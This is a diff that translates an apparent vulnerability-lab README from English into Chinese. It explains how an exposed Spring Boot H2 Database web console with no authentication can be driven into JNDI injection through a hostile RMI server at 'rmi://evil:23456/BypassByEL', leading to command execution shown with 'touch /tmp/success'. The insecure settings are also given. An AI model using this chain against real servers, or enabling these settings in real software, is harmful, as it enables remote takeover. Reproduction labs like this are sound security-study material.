@@ -1,33 +1,31 @@
-# H2 Database Web Console Unauthorized Access
+# H2 Database Console 未授权访问
 
-[中文版本（Chinese Version）](README.zh-cn.md)
-
-H2 database is a embedded in-memory database in Java. Springboot with h2 database comes with a web management page which has no authentication if you set the following options:
+H2 database是一款Java内存数据库，多用于单元测试。H2 database自带一个Web管理页面，在Spirng开发中，如果我们设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权：
 
 ```
 spring.h2.console.enabled=true
 spring.h2.console.settings.web-allow-others=true
 ```
 
-This management page supports using JNDI to load the JDBC driver, which can lead to remote code execution via remote class loading.
+利用这个管理页面，我们可以进行JNDI注入攻击，进而在目标环境下执行任意命令。
 
-References: 
+参考链接：
 
 - <https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&mid=2247483658&idx=1&sn=584710da0fbe56c1246755147bcec48e>
 
-## Setup
+## 漏洞环境
 
-Start a spring-boot with h2 database and embedded tomcat:
+执行如下命令启动一个Springboot + h2database环境：
 
 ```
 docker-compose up -d
 ```
 
-After started the container, the spring-boot is listening on `http://your-ip:8080`, the management page is `http://your-ip:8080/h2-console/` by default. 
+启动后，访问`http://your-ip:8080/h2-console/`即可查看到H2 database的管理页面。
 
-## Vulnerability Reproduce
+## 漏洞复现
 
-Reference to *[Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)*, we should use `org.apache.naming.factory.BeanFactory` and `javax.el.ELProcessor` to launch the external process after Java 8u191:
+目标环境是Java 8u252，版本较高，因为上下文是Tomcat环境，我们可以参考《[Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)》，使用`org.apache.naming.factory.BeanFactory`加EL表达式注入的方式来执行任意命令。
 
 ```java
 import java.rmi.registry.*;
@@ -53,20 +51,22 @@ public class EvilRMIServerNew {
 }
 ```
 
-Simply use this tool *[JNDI](https://github.com/JosephTribbianni/JNDI)* to exploit the vulnerability. First, set up the target command to `touch /tmp/success` at `config.properties`:
+我们可以借助这个小工具[JNDI](https://github.com/JosephTribbianni/JNDI)简化我们的复现过程。
+
+首先设置JNDI工具中执行的命令为`touch /tmp/success`：
 
 ![](3.png)
 
-Then start the `JNDI-1.0-all.jar`, is will be listening on `0.0.0.0:23456`. fill in the form based on these pieces of information:
+然后启动`JNDI-1.0-all.jar`，在h2 console页面填入JNDI类名和URL地址：
 
 ![](1.png)
 
-`javax.naming.InitialContext` is the JNDI factory class name, URL `rmi://evil:23456/BypassByEL` is your evil RMI address.
+其中，`javax.naming.InitialContext`是JNDI的工厂类，URL `rmi://evil:23456/BypassByEL`是运行JNDI工具监听的RMI地址。
 
-Evil RMI server received the requests:
+点击连接后，恶意RMI成功接收到请求：
 
 ![](2.png)
 
-`touch /tmp/success` has been execute successfully:
+`touch /tmp/success`已成功执行：
 
 ![](4.png)
